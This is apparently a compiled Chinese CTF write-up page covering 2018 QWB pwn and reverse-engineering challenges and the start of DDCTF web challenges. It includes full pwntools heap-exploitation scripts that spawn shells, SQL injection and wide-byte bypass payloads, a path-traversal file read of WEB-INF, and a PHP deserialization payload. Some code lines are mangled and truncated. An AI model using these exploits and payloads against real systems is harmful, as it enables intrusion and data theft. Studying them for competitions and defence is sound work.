p64(0x100)+p64(0x110)+'B'*255 对于chunk4 0x101 表示当前堆块大小（包括头）是0x100， 其前一个堆块为inuse状态 对于chunk5 0x100 表示前一个堆块大小（包括头）是0x100， 0x110表示当前堆块大小为0x110,其前一个堆块为free状态 这样在释放Chunk5 的时候就会把Chunk4 从链表删除，达到unlink目的。 2、绕过指针检测 对Chunk4 unlink时要检测 fd->bk == bk->fd 让Chunk4的fd=0x6020d8-0x18 bk=0x6020d8-0x10 那么其fd->bk= fd+0x18=0x6020d8 bk->fd=bk+0x10= 0x6020d8这样满足条件了 然后unlink时 FD = P->fd; BK = P->bk; FD->bk = BK; BK->fd = FD; 最后一次指针改写BK->fd = FD 使得 bk->fd也就是0x6020d8 指向的内容为 fd (0x6020d8-0x18 )即0x6020c0 task_gettingStart_ktQeERc 载入IDA 看到关键字符串 且有/bin/sh 双击进入 发现连续三个跳转之后 就是最终结果 直接F5看伪代码 看到read()之后 这不就是栈溢出嘛 覆盖v7 v8的数据达到条件即可获得shell 栈中顺序如下 但是那个v8 != 0.1把我困住好大会 后来找到了 对了 我开始是用qira调试的 最后exp: opm 分析题目可得出数据结构如下： struct stru{ int (func*)(); char *name_ptr; int length; int punches; } 漏洞位置 在add函数中存在两个gets()函数，存在缓冲区溢出。 利用思路 观察栈分布，gets()超过0x80长度后会覆盖掉栈上的结构体变量，并且add函数中有2次覆盖的机会，第1次覆盖将会影响到length的存放，第2次覆盖将会影响到punches的存放，以及kill函数的参数。 在kill函数中，可以将传进参数a1 + 8作为地址中的内容打印出来，以及将a1 + 0x18位置的内容以16进制的形式打印出来。在我们通过溢出控制传入参数后可以做leak。 从checksec中可以看到是保护机制全开的，所以我们需要leak出程序段基址和libc基址。结合kill函数和结构体的数据结构可以初步确定leak方式为覆盖如kill的参数，使参数+ 8放的是函数的got表，使参数+ 0x18放的是程序段的地址，两次leak不需要同时进行。 难点就在于如何leak，由于gets()会在输入后面加上\\x00，所以我们并不能随心所欲地将地址覆盖成我们想要的地址，而只能覆盖成以00结尾的地址，这就需要我们事先将got表布置在以08结尾的地址或将程序段地址布置在以18结尾的地址。若我们事先知道程序段的基址的话，可以通过在输入name_ptr时轻松地将got表布置在08的地址。现在需要解决的问题就是如何得到程序段基址，即如何将程序段地址布置在18的地址，由于给punches赋值是在第二次覆盖掉结构体后，所以不能用+ 0x18来进行leak，推翻上一段的利用思路。所以我们只能够通过构造指向程序段的指针来利用第一个%s进行leak。 在leak出两个地址过后，由于show函数会将add函数返回的结构体的第一个8字节作为函数的入口地址执行该函数，而且add的返回值为我们第二次覆盖后的结构体，可控，所以我们可以尝试将该地址指向一个one_gadget就能起shell了。 leak程序段基址 根据WriteUp分析了半天才看出来是怎么构造的，还是太菜了，这也是为什么这个利用思路写的这么拖沓的原因。。。我们先多add几次，将地址抬高到d00的位置，再次add时，第一次覆盖结构体时输入0x81位，将结构体覆盖为00xx，使后面的name_ptr、length、punches都写到00xx后的地址上去，此时00xx + 8为name_ptr指针，指向name字符串，但这个name_ptr的值为d，若我们能将后面一个字节覆盖成00就可以在第二次覆盖结构体时将结构体再次改为00xx去，利用kill打印出我们事先在d00布置好的程序段地址。此时就利用字节不对齐的方式进行最低位改为00的操作，在将_d00布置好后的下一次add中的第一次覆盖我们将结构体覆盖为00xx此次add不触发第二次覆盖。然后再在下一次的add中的第一次覆盖时，我们将结构体覆盖为00xx - 15，覆盖后会在对length进行赋值，即00xx - 15 + 16进行赋值时，将刚刚的d最低位(地址为00xx + 9)覆盖成00然后在第二次覆盖时，将结构体又覆盖会00xx，调用kill函数即可实现leak。 my-exp from pwn import * local = 1 if local: p = process('./opm') libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so') else: print 'time is up' def add(name , punches): p.recvuntil('(E)xit\\n') p.sendline('A') p.recvuntil('name:\\n') p.sendline(name) sleep(0.1) p.recvuntil('punch?\\n') p.sendline(str(punches)) sleep(0.1) def show(): p.recvuntil('(E)xit\\n') p.sendline('S') def debug(): print pidof(p)[0] raw_input() elf = ELF('./opm') #one_gadget = 0x45216 0x4526a 0xf02a4 0xf1147 #step 1 leak elf_base add('a' * 0x30 , 0x10) add('b' * 0x30 , 0x20) add('c' , 0x30) add('d' * 0x80 + '\\x63' , 0x40) debug() add('e' * 0x80 + '\\x54' , '1' * 0x80 + '\\x63') #use 0054 + 0x10 (v6 -> length) to make a d00 , change 0054 to 0063 to point d00 elf.address = u64(p.recvuntil('>')[1:-1] + '\\x00' * 2) - 0xb30 success('elf_base => ' + hex(elf.address)) #step 2 use f00 to leak libc_base atoi_got = elf.got['atoi'] success('atoi_got => ' + hex(atoi_got)) add('f' * 8 + p64(atoi_got) , 0x50) add('g' , 'g' * 0x80) libc.address = u64(p.recvuntil('>')[1:-1] + '\\x00' * 2) - libc.symbols['atoi'] success('libc_base => ' + hex(libc.address)) #step 3 use 000 and show() to trigger one_gadget one_gadget = libc.address + 0x4526a add('h' * 0x60 + p64(one_gadget), '') add('i' * 0x80 , '') show() #debug() p.interactive() note 漏洞位置 该程序为socket程序，绑定为1234端口，需要系统有note的用户权限。程序在change_title的功能中存在off_by_one漏洞。 不过由于前面check_asc()中的限制，导致只能用0x0a、0x21、0x22、0x23、0x26、0x27、0x3F、0x40这几个规定内的字节进行溢出。 利用思路 题目限制只能realloc3次，利用0x40进行off_by_one并布置unlink环境，在此之前应该首先利用change_content功能构造好满足0x40大小的下一个chunk head。由于0x40大小的堆块在fastbin的范围内，无法直接free触发unlink，于是第二次realloc将该chunk放入fastbin中，在第三次realloc时触发malloc_consolidate进行unlink。unlink后，使.bss上的title指向comment指针，再配合change_comment功能，实现任意地址写，最终采用写realloc_hook为system的方法get shell。(不知道是否本地环境的问题，一开始就能直接leak libc) realloc 函数原型为realloc(ptr, size)，其中ptr为指向堆的指针，size为需要realloc的大小，根据size的大小有以下几种情况： size = 0时，相当于free(ptr)。 size size = ptr原大小时，没什么卵用，不会进行任何操作。注：该等于为将size对齐后相等。 size > ptr原大小时，若ptr下方为top chunk或者下方存在fastbin之外的free chunk并且size(free chunk) + size(ptr原大小) ≥ size，则将该堆块大小扩展至size，若不满足上述条件，则相当于free(ptr)然后malloc(size)。 malloc_consolidate 该函数会将fastbin中的所有chunk整合到unsort bin中，并且在从fastbin中摘下chunk时会检查相邻的堆块是否为free状态，若为free状态则将触发堆融合。本题采用malloc大于top chunk的size触发malloc_consolidate。 my-exp.py from pwn import * local = 1 if local: p = remote('0' , 1234) libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so') else: print 'time is up' def change_title(title): p.recvuntil('--->>\\n') p.sendline('1') p.recvuntil('title:') p.send(title) #off_by_one def change_content(size , content): p.recvuntil('--->>') p.sendline('2') p.recvuntil('256):') p.sendline(str(size)) p.recvuntil('content:') p.sendline(content) def change_comment(comment): p.recvuntil('--->>') p.sendline('3') p.recvuntil('comment:') p.sendline(comment) def show(): p.recvuntil('--->>') p.sendline('4') p.recvuntil('is:') return p.recvuntil('\\n')[:-1] #step1 leak libc_base libc.address = u64(show().ljust(8 , '\\x00')) - 0x3c4b78 success('libc_base => ' + hex(libc.address)) system_addr = libc.symbols['system'] info('system_addr => ' + hex(system_addr)) realloc_hook = libc.symbols['__realloc_hook'] info('realloc_hook => ' + hex(realloc_hook)) binsh_addr = libc.search('/bin/sh\\x00').next() info('binsh_addr => ' + hex(binsh_addr)) #step2 make unlink content = 0x602070 payload = p64(0x30) + p64(0x20) + p64(content - 0x18) + p64(content - 0x10) + p64(0x20) + '\\x40' change_content(0x78 , 0x38 * 'A' + p64(0x41)) change_title(payload) #step3 free content to fastbin change_content(0x100 , '') #step4 trigger malloc_consolidate to unlink change_content(0x20000 , '') #step5 realloc_hook -> system change_title(p64(realloc_hook) + '\\n') change_comment(p64(system_addr)) #step6 reset chance & content -> /bin/sh change_title(p64(0x602050) + p64(binsh_addr) + '\\n') change_comment(p64(0)) #step7 realloc(content , size) => realloc_hook(binsh_addr) => system('/bin/sh\\x00') p.recvuntil('option--->>') p.sendline('2') p.recvuntil('(64-256):') p.sendline('') #size doesn't matter #Get Shell & Have Fun p.interactive() Re simple 一个安卓题目，简单题，java 层做了一些数学运算，总结一下就是一元二次方程，我懒得解，反正128种可能，直接爆破就好了。 a = [0, 146527998, 205327308, 94243885, 138810487, 408218567, 77866117, 71548549, 563255818, 559010506, 449018203, 576200653, 307283021, 467607947, 314806739, 341420795, 341420795, 469998524, 417733494, 342206934, 392460324, 382290309, 185532945, 364788505, 210058699, 198137551, 360748557, 440064477, 319861317, 676258995, 389214123, 829768461, 534844356, 427514172, 864054312] b = [13710, 46393, 49151, 36900, 59564, 35883, 3517, 52957, 1509, 61207, 63274, 27694, 20932, 37997, 22069, 8438, 33995, 53298, 16908, 30902, 64602, 64028, 29629, 26537, 12026, 31610, 48639, 19968, 45654, 51972, 64956, 45293, 64752, 37108] c = [38129, 57355, 22538, 47767, 8940, 4975, 27050, 56102, 21796, 41174, 63445, 53454, 28762, 59215, 16407, 64340, 37644, 59896, 41276, 25896, 27501, 38944, 37039, 38213, 61842, 43497, 9221, 9879, 14436, 60468, 19926, 47198, 8406, 64666] d = [0, -341994984, -370404060, -257581614, -494024809, -135267265, 54930974, -155841406, 540422378, -107286502, -128056922, 265261633, 275964257, 119059597, 202392013, 283676377, 126284124, -68971076, 261217574, 197555158, -12893337, -10293675, 93868075, 121661845, 167461231, 123220255, 221507, 258914772, 180963987, 107841171, 41609001, 276531381, 169983906, 276158562] result = [0] # a[i] == b[i] * bak_input[i] * bak_input[i] + c[i] * bak_input[i] + d[i] # a[i + 1] == b[i] * bak_input[i + 1] * bak_input[i + 1] + c[i] * bak_input[i + 1] + d[i]) for i in range(34): for j in range(127): if a[i + 1] == b[i] * j * j + c[i] * j + d[i]: result.append(j) print result flag = \"\" for r in result: flag += chr(r) print flag # flag{MAth_i&_GOOd_DON7_90V_7hInK?} picture-lock 安卓题，和加密勒索软件的套路有点像，输入一个文件，输出其加密后的结果。目标是将某个加密后的文件解密出来，flag 就在里面。 java 层基本没东西，算一下签名的md5，将原本文件、加密后文件、md5带入 native。 没有init_array，没有JNI_OnLoad，直接看JNI 方法。 一进来先初始化了 AES 的 SBox，比较骚的地方在于他初始化了2组 AES 的 SBox，也就是相当于有2个 AES_Cipher，使用的 key 不同，这部分其实我看不大懂，只是调试时候发现的。 if ( new_fd ) { old_file_buffer = (char *)malloc(0x100u); newFile = (char *)old_fd; bbb_1024 = malloc(0x100u); for ( i = 0; ; ++i ) { v26 = md5String[i & 0x1F]; nextChar = fread(old_file_buffer, 1u, md5String[i & 0x1F], (FILE *)newFile); dataLen = nextChar; if ( !nextChar ) goto done; if ( nextChar 然后开始读文件，每次读取 md5[i&0x1F]个字节，如果长度小于16，就 PKCS5 到16字节。 left_or_right = (int **)&g_buf_0x180_p0x30; if ( !(v26 & 1) ) left_or_right = &g_buf_0x180; 对读入的字节前16byte 进行 AES_ECB 加密，使用的 KEY 是第奇数次使用md5[0:16]，第偶数次使用 md5[16:32] 。 if ( dataLen >= 0x11 ) { kk = 16; p_md5String_1 = md5String; do { bbb_1024[kk] = old_file_buffer[kk] ^ p_md5String_1[kk % 32]; ++kk; } while ( kk 16字节以后的， plain[index]逐位 xor上 md5[index] 。之后将这些 byte 写到加密后的文件里。 写一点 testcase 验证一下我们的猜想，发现是正确的，下文是解密的 python 脚本。 from Crypto.Cipher import AES md5 = \"f8c49056e4ccf9a11e090eaf471f418d\" odd_key = \"1e090eaf471f418d\" even_key = \"f8c49056e4ccf9a1\" odd_cipher = AES.new(odd_key, AES.MODE_ECB) even_cipher = AES.new(even_key, AES.MODE_ECB) with open('/Users/leadroyal/CTF/2018/qwb/assets/flag.jpg.lock') as f: data = f.read() offset = 0 i = 0 output = \"\" count = 0 while True: count += 1 current = data[offset:offset + ord(md5[i])] if current == '': break offset += ord(md5[i]) if ord(md5[i]) % 2 == 0: left = even_cipher.decrypt(current[0:16]) output += left else: left = odd_cipher.decrypt(current[0:16]) output += left for j in range(16, len(current)): output += chr(ord(current[j]) ^ ord(md5[j % 32])) i += 1 i %= 32 print len(data) print len(output) # print output.encode('hex') with open('/tmp/flag.jpg', 'wb') as fd: fd.write(output) 三、hide 这题偷鸡了，不会做，说是的 upx 的壳，但似乎做了一些修改，瞎 jb 做居然做出来了。 1、运行过程中尝试去 attach，发现已经被 trace了，那肯定是被反调试了。 2、直接运行和使用 gdb 运行结果不一致，调试情况下连输出都没有，直接 exit 掉了，所以肯定是被反调试了。 最开始比较害怕是多层 upx，因为调试时候看到很多次 mmap，比较害怕。反正不会做，不小心看到一个叫“在所有syscall 上下断点”，叫 catch syscall 。 既然是加壳的，肯定会有 mmap 、 mprotect 这样的操作，于是就”catch syscall”、”c”，这样一直按，一直按，大概按到五六十次时候，发现了一些 ptrace，管他呢，跳过再说。之后就到了要求输入 flag 的位置，开心，dump 一下这个内存块，ida 打开就可以看到逻辑了！ 看起来非常舒服，检查了首尾，然后按照顺序交替调用了6次加密函数。 __int64 __usercall sub_C8CC0@(unsigned int *input@) { __int64 result; // rax@7 unsigned int tmp_i32; // [rsp+18h] [rbp-48h]@3 unsigned int tmp_i64[2]; // [rsp+1Ch] [rbp-44h]@3 signed int i; // [rsp+24h] [rbp-3Ch]@1 signed int j; // [rsp+28h] [rbp-38h]@3 int keyPool[4]; // [rsp+40h] [rbp-20h]@1 __int64 v7; // [rsp+58h] [rbp-8h]@1 v7 = canary; keyPool[0] = 1883844979; keyPool[1] = 1165112144; keyPool[2] = 2035430262; keyPool[3] = 861484132; for ( i = 0; i > 5) ^ 16 * tmp_i64[0]) + tmp_i64[0]); tmp_i64[1] += 1735289196; tmp_i64[0] += (keyPool[(unsigned __int64)((tmp_i64[1] >> 11) & 3)] + tmp_i64[1]) ^ (((tmp_i32 >> 5) ^ 16 * tmp_i32) + tmp_i32); } input[2 * i] = tmp_i32; input[2 * i + 1] = tmp_i64[0]; } result = canary ^ v7; if ( canary != v7 ) result = ((__int64 (*)(void))loc_C8B9A)(); return result; } 这个很像 tea 加密，是可逆的。 char *__usercall sub_C8E50@(char *a1@) { char *result; // rax@3 signed int i; // [rsp+14h] [rbp-4h]@1 for ( i = 0; i 这个就是普通的 xor，也是可逆的。 写个 python 反一下 keyPool = [1883844979, 1165112144, 2035430262, 861484132, ] array_car = [1735289196, 3470578392, 910900292, 2646189488, 86511388, 1821800584, 3557089780, 997411680] target = [0x7f13b852, 0x1bf28c35, 0xd28663f4, 0x311e4f73] # target = [0xc234e08, 0x4ce42924, 0xd28663f4, 0x311e4f73] # target = [0x221d5a3e, 0xd9c589da, 0x141d0409, 0x41e88c85] def de_xor(enc): for _i in range(4): current = enc[_i] a = current & 0xFF b = (current & 0xFF00) >> 8 c = (current & 0xFF0000) >> 16 d = (current & 0xFF000000) >> 24 a ^= (_i * 4 + 0) b ^= (_i * 4 + 1) c ^= (_i * 4 + 2) d ^= (_i * 4 + 3) enc[_i] = a | (b > 5) ^ (bar > 11) & 3)] + car tmp_b = ((foo >> 5) ^ 16 * foo) + foo bar += tmp_a ^ tmp_b bar &= 0xffffffff # print hex(foo), hex(bar), hex(car) # array_car.append(car) # print array_car return foo, bar def solver(enc_foo, enc_bar): foo = enc_foo bar = enc_bar car = array_car[7] for _i in range(8): tmp_a = keyPool[((car >> 11) & 3)] + car tmp_b = ((foo >> 5) ^ 16 * foo) + foo bar -= tmp_a ^ tmp_b bar = (bar + 0xffffffff + 1) & 0xffffffff car -= 1735289196 car = (car + 0xffffffff + 1) & 0xffffffff tmp_a = keyPool[(car & 3)] + car tmp_b = ((bar >> 5) ^ (bar baby_re 直接执行文件，输出”nope”。 代码里有大量没用的反调试代码，最后发现有个函数有用，而且有两个特征。 输出”nope”是在这个函数里的 这个函数有读文件的操作，打开了叫”nothing”的文件 于是手动创建”nothing”的文件，随便写点东西进去，再执行这个exe，发现确实被加密了，但最后的几个byte是完整的，看起来是16byte一组的ECB模式。 这时候直接set RIP到这个函数，发现功能没有出问题，确实其他代码是反调试代码，全都NOP掉就行了。 主要就是逆sub_140002B60吧，没什么好讲的，还是这个套路。 python如下 target = [0xb, 0xe8, 0xa3, 0xd6, 0xf7, 0x19, 0x19, 0x4c, 0x12, 0x42, 0x0, 0x54, 0x3d, 0x41, 0xbb, 0x16, 0xe5, 0x6a, 0x87, 0xec, 0xd0, 0xeb, 0xfa, 0x62, 0x3d, 0xce, 0x61, 0x1e, 0xe, 0xc9, 0x11, 0xed, 0x68, 0x74, 0x3f, 0x7d, ] # target = [0x62, 0x3f, 0xc6, 0x1f, 0xca, 0x03, 0x0b, 0xae, 0xe2, 0x05, 0xf8, 0xf7, 0xe1, 0xe1, 0x81, 0x46] plain = [48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 97, 98, 99, 100, 101, 102, ] keyPool = [0xface, 0xdead, 0xbabe, 0xd00d] magic = 0x61c88647 before_array = [0, 2654435769, 1013904242, 3668340011, 2027808484, 387276957, 3041712726, 1401181199, 4055616968, 2415085441, 774553914, 3428989683, 1788458156, 147926629, 2802362398, 1161830871, 3816266640, 2175735113, 535203586, 3189639355, 1549107828, 4203543597, 2563012070, 922480543, 3576916312, 1936384785, 295853258, 2950289027, 1309757500, 3964193269, 2323661742, 683130215] after_array = [2654435769, 1013904242, 3668340011, 2027808484, 387276957, 3041712726, 1401181199, 4055616968, 2415085441, 774553914, 3428989683, 1788458156, 147926629, 2802362398, 1161830871, 3816266640, 2175735113, 535203586, 3189639355, 1549107828, 4203543597, 2563012070, 922480543, 3576916312, 1936384785, 295853258, 2950289027, 1309757500, 3964193269, 2323661742, 683130215, 3337565984] print len(before_array) print len(after_array) before = 0 after = 0 right = plain[0] | (plain[1] > 5))) adder1 &= 0xffffffff right += adder1 right &= 0xffffffff before -= magic before &= 0xffffffff after = before adder2 = (before + keyPool[(before >> 11) & 3]) ^ (right + (16 * right ^ (right >> 5))) adder2 &= 0xffffffff left += adder2 left &= 0xffffffff print hex(left), hex(right), hex(adder1), hex(adder2), hex(before) print hex(left), hex(right) print \"====================================\" target_left = 0xae0b03ca target_right = 0x1fc63f62 for j in range(4): target_right = target[0 + j * 8] | (target[1 + j * 8] > 11) & 3]) ^ (target_right + (16 * target_right ^ (target_right >> 5))) sub1 &= 0xffffffff target_left -= sub1 target_left &= 0xffffffff before += magic before &= 0xffffffff sub2 = (before + keyPool[after & 3]) ^ (target_left + (16 * target_left ^ (target_left >> 5))) sub2 &= 0xffffffff target_right -= sub2 target_right &= 0xffffffff print hex(target_left), hex(target_right), hex(sub2), hex(sub1) print hex(target_left)[2:].decode('hex')[::-1], hex(target_right)[2:].decode('hex')[::-1] # tf{t qwbc # is_n his_ # hat_ ot_t # _rig hard # ht?} # qwbctf{this_is_not_that_hard_right?} 评论区 请文明评论，禁止广告 CTF Writeup®未经许可，禁止转载。Copyright © CTF Writeup all right reserved, powered by CTF WriteupModified at 2019-09-22 21:54:35 0 issues reported "},"articals/2018ddctf.html":{"url":"articals/2018ddctf.html","title":"2018DDCTF","keywords":"","body":"2018DDCTF滴滴高校闯关赛 题目类型： 类型 年份 难度 官方赛事题 2018 中 题目下载: Android题目文件下载 ：https://github.com/LeadroyaL/attachment_repo/tree/master/didictf_2018 网上公开WP： https://impakho.com/post/ddctf-2018-writeup http://blog.5am3.com/2018/04/24/ddctf2018/ https://www.jianshu.com/p/e6b66c27bdfd https://www.anquanke.com/post/id/144879 http://www.leadroyal.cn/?p=466 https://www.anquanke.com/post/id/145553 本站备份WP： 感谢作者：奈沙夜影、5am3、LeadroyaL、impakho WEB 感谢5am3师傅 ！ 数据库的秘密 [注意] 本次DDCTF所有WEB题无需使用也禁止使用扫描器 http://116.85.43.88:8080/JYDJAYLYIPHCJMOQ/dfe3ia/index.php 打开后会发现返回如下。 非法链接，只允许来自 123.232.23.245 的访问 此时可以通过修改HTTP请求头中的X-Forwarded-For即可。即添加以下字段 X-Forwarded-For:123.232.23.245 在这里，我用的是火狐的一个插件Modify Header Value (HTTP Headers)。 发现该网页是一个简单的查询列表。再加上题目中给的hint。可以判断为SQL注入题目。 经过测试，发现以上三个点均不是注入点。此时分析数据包，可以发现存在第四个注入点。 然后查看源码，发现一个隐藏字段。经过测试发现，该字段可以注入。 admin' && '1'='1'# admin' && '1'='2'# 尝试注入 author，可以发现以下内容信息 and （可以用&&代替） union select （很迷，这两个不能同时出现，然而自己又找不到其他方式） 仅允许#号注释 然后注入渣的自己就比较无奈了。。不会啊。只好祭出盲注大法了。经过尝试，最终构造以下payload可用。 admin' && binary substr((select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA),1,1) 然后开始写脚本，此时遇到了一个问题。发现他有一个验证。为了check你中途是否修改数据，而加入的一个hash比对。 首先将你的准备传送的内容进行某种hash后变为sig字段，然后再将sig通过get请求一起发送过去。此时服务器端会将sig与你发送的内容的hash比对一下。此时可以减少抓包中途修改内容的可能性。 所以，为了省事，我选择直接将这个代码调用一下。 用python的execjs库，可以直接执行js代码。 最终跑起脚本，获取到flag DDCTF{IKIDLHNZMKFUDEQE} 专属链接 题目： 现在，你拿到了滴滴平台为你同学生成的专属登录链接，但是你能进一步拿到专属他的秘密flag么 提示1：虽然原网站跟本次CTF没有关系，原网站是www.xiaojukeji.com 注：题目采用springmvc+mybatis编写，链接至其他域名的链接与本次CTF无关，请不要攻击 http://116.85.48.102:5050/welcom/3fca5965sd7b7s4a71s88c7se658165a791e 解答： 首先打开网站，发现是滴滴的官网。。 此时发现所有连接几乎全部重定向到了滴滴官网。 无奈下查看元素。发现hint 尝试访问，http://116.85.48.102:5050/flag/testflag/yourflag发现报错500，好像是数组越界？ 此时尝试将yourflag替换为DDCTF{1321}，返回failed!!!。 猜测爆破flag么？完全没戏啊。看样子应该有其他地方可以入手。 然而又发现了主页js的一句神奇的话。一个ajax语句。 然并卵，404。。。。。 此时只好继续分析题目，发现了令人眼前一亮的东西。对，就是下面这个icon。 http://116.85.48.102:5050/image/banner/ZmF2aWNvbi5pY28= 访问后，发现下载了favicon.ico 此时发现图标好像图片很奇怪。后来果然验证了这是个hint。 此时可以愉快地玩耍了，这样一来，题目源码有了，还愁拿不下来么。 美滋滋。此时也知道了题目中hint的用意。题目采用springmvc+mybatis编写 百度搜索springmvc+mybatis文件结构，美滋滋读文件。 首先，大概知道了资源文件都是在WEB-INF文件夹下，所以猜测这个icon也在这里，此时我们要先确定文件夹。 WEB-INF下有一个web.xml，此时尝试读取，最终确定目录../../WEB-INF/web.xml。 然后拖文件。这里说几点注意事项。 通过../../WEB-INF/web.xml确认位置。 继续根据web.xml中的内容进行文件读取。classpath是WEB-INF/classes 读class文件时根据包名判断文件目录com.didichuxing.ctf.listener.InitListener 即为WEB-INF/com/didichuxing/ctf/listener/InitListener.class 制造网站报错，进一步找到更多的文件 差不多，注意一上四点，就可以拿到尽量多的源码了。 拖到源码后，就不美滋滋了。。。还好去年在DDCTF学过2017第二题的安卓逆向，会逆向了。 （此时坑点：jd-jui仅可逆jar，需要将class打成压缩包改为jar再逆向） 此时开始苦逼的分析源码。 分析后发现，存在接口，用当前用户的邮箱去生成一个flag。 但是flag是加密的。此时加密流程代码里都有，是一个RSA加密。密钥在服务器中的 此时又一次明白了，为什么读文件允许ks文件。 来吧，首先先拿邮箱申请一个flag 然而此时申请flag，邮箱也得先加密。自己提取出来的加密脚本如下。 public static String byte2hex(byte[] b) { StringBuilder hs = new StringBuilder(); for (int n = 0; (b != null) && (n 坑：但是此时后端仅允许post方式。且参数是以get传递的。 成功获取到flag Encrypted flag : 506920534F89FA62C1125AABE3462F49073AB9F5C2254895534600A9242B8F18D4E420419534118D8CF9C20D07825C4797AF1A169CA83F934EF508F617C300B04242BEEA14AA4BB0F4887494703F6F50E1873708A0FE4C87AC99153DD02EEF7F9906DE120F5895DA7AD134745E032F15D253F1E4DDD6E4BC67CD0CD2314BA32660AB873B3FF067D1F3FF219C21A8B5A67246D9AE5E9437DBDD4E7FAACBA748F58FC059F662D2554AB6377D581F03E4C85BBD8D67AC6626065E2C950B9E7FBE2AEA3071DC0904455375C66A2A3F8FF4691D0C4D76347083A1E596265080FEB30816C522C6BFEA41262240A71CDBA4C02DB4AFD46C7380E2A19B08231397D099FE 然后，解密吧。。 只能百度了，java又不熟，RSA更不熟，尤其还是这种hex的。逆源码都失败了。一个劲报错。（查百度，好像是因为啥空格之类的。打不过打不过） 最终发现一个好玩的，可以从keystore提取RSA私钥。这样一来，又继续美滋滋。 https://blog.csdn.net/zbuger/article/details/51690900 然后照猫画虎，提出私钥。此时祭出自己的一个无敌大件。之前从某次CTF安卓题提出的RSA解密脚本。（当时题目简单，加解密都给了，改个函数名就ok了。） (╯°□°）╯︵ ┻━┻ 要不是在线的解不了。才不会想起这个大招（已放到附件，记得将 密文to ascii 再 to base64。）。。。。。 通过在线工具，提取出公私钥，然后跑脚本。最终拿到flag。 DDCTF{1797193649441981961} 注入的奥妙 题目： 本题flag不需要包含DDCTF{}，为[0-9a-f]+ http://116.85.48.105:5033/4eaee5db-2304-4d6d-aa9c-962051d99a41/well/getmessage/1 解答： 按照题目要求，这题应该是个注入题，毫无疑问。 查看源码，发现给了big5的编码表，此时猜测可以通过宽字节进行注入。 1餐' and 1=1%23 orderby，发现有三个字段，尝试构造联合查询语句，发现union会被直接删除。此时双写绕过即可。 此时查询数据库： 1餐' uniunionon select SCHEMA_NAME,2,3 from information_schema.SCHEMATA %23 然后继续查询表名： 1餐' uniunionon select TABLE_NAME,2,3 from information_schema.tables where table_schema=sqli %23 此时发生了一件尴尬的事情。我们无法继续构造单双引号，这样数据库会报以下错误。 此时祭出hex大法。数据库会直接将0x开头的进行转码解析。 1餐' uniunionon select TABLE_NAME,2,3 from information_schema.tables where table_schema=0x73716c69 %23 此时成功的爆出来了三个表 message,route_rules,users 然后就没啥好说的了。挨个查着玩就可以了，基本同上。然后查字段啥的。 查路由的时候，有点小坑，不知道后端怎么解析的，会将一列数据解析到多列，此时用mysql的to_base64()函数即可。 通过路由信息，我们可以发现存在static/bootstrap/css/backup.css源码泄露。 通过以下三行脚本即可保存该文件。 import requests f=open('a.zip','wb') f.write(requests.get('http://116.85.48.105:5033/static/bootstrap/css/backup.css').content) 接下来就是对PHP代码的审计。 首先，分析路由。我们从数据表内知道了有以下几条规则 get/:u/well/getmessage/:s Well#getmessage get/:u/justtry/self/:s JustTry#self post*/:u/justtry/try JustTry#try 首先第一条，就是咱刚刚实现注入的那一个。不用多看，逻辑差不多清楚。 第二，三条，调用的都是justtry类下的某个方法。所以可以跟进去，重点分析下这个函数。 此时看见了 unserialize ，倍感亲切，这不就是反序列化么。 此时就需要考虑反序列化了。他后面限制了几个类，此时我们可以一一打开分析。 test类，顾名思义，就是一个测试用的。 此时我们发现他的析构函数中，有一条特殊的句子。跟进去之后发现，他会将falg打印出来。 仔细分析源码后发现，这个test类通过调用Flag类来获取flag，然而Flag类又需要调用SQL类来进行数据库查询。 所以，这个反序列化是个相当大的工程。自己手写是无望了。 首先尝试了一下，自己写三个类的调用。。。然而失败了。 最后复现源码，并在try方法打印序列化对象后。（uuid是你的url那串，uuid类下正则可以看出来。） 发现，他是有一个命名空间的要求。序列化后语句如下 O:17:\"Index\\Helper\\Test\":2:{s:9:\"user_uuid\";s:36:\"4eaee5db-2304-4d6d-aa9c-962051d99a41\";s:2:\"fl\";O:17:\"Index\\Helper\\Flag\":1:{s:3:\"sql\";O:16:\"Index\\Helper\\SQL\":2:{s:3:\"dbc\";N;s:3:\"pdo\";N;}}} 最终的Payload如下： url:http://116.85.48.105:5033/4eaee5db-2304-4d6d-aa9c-962051d99a41/justtry/try/ postdata: serialize=%4f%3a%31%37%3a%22%49%6e%64%65%78%5c%48%65%6c%70%65%72%5c%54%65%73%74%22%3a%32%3a%7b%73%3a%39%3a%22%75%73%65%72%5f%75%75%69%64%22%3b%73%3a%33%36%3a%22%34%65%61%65%65%35%64%62%2d%32%33%30%34%2d%34%64%36%64%2d%61%61%39%63%2d%39%36%32%30%35%31%64%39%39%61%34%31%22%3b%73%3a%32%3a%22%66%6c%22%3b%4f%3a%31%37%3a%22%49%6e%64%65%78%5c%48%65%6c%70%65%72%5c%46%6c%61%67%22%3a%31%3a%7b%73%3a%33%3a%22%73%71%6c%22%3b%4f%3a%31%36%3a%22%49%6e%64%65%78%5c%48%65%6c%70%65%72%5c%53%51%4c%22%3a%32%3a%7b%73%3a%33%3a%22%64%62%63%22%3b%4e%3b%73%3a%33%3a%22%70%64%6f%22%3b%4e%3b%7d%7d%7d mini blockchain 题目 ： 某银行利用区块链技术，发明了DiDiCoins记账系统。某宝石商店采用了这一方式来完成钻石的销售与清算过程。不幸的是，该银行被黑客入侵，私钥被窃取，维持区块链正常运转的矿机也全部宕机。现在，你能追回所有DDCoins，并且从商店购买2颗钻石么？ 注意事项：区块链是存在cookie里的，可能会因为区块链太长，浏览器不接受服务器返回的set-cookie字段而导致区块链无法更新，因此强烈推荐写脚本发请求 题目入口： http://116.85.48.107:5000/b942f830cf97e 解答 ： 拿到题目，内心是拒绝的。因为虽然说区块链这么火，但是自己还是没怎么了解过。 第一反应是。药丸，没戏了。但是，搞信息安全的孩子怎么可以轻言放弃呢！ 时间辣么长，还不信看不明白个区块链。最后肛了两天多，才大概明白了题目 首先，题目给了源码，这个很棒棒。 建议大家分析题目时将代码也多读几遍，然后再结合参考资料进行理解。 在这里不做太多的理解源码的讲解。 最初我是将重心代码的一些逻辑上，以及加密是否可逆。（发现自己太年轻，看不懂） 然后慢慢的开始了解区块链，最后发现这种手段。 这道题目中，利用了区块链一个很神奇的东西。 因为区块链是一个链表，而且还是一个谁都可以增加的，此时，人们达成了一种默认，以最长的那条链为主链（正版），其他的分支都是盗版。 如下图，就是此时该题目的区块链。 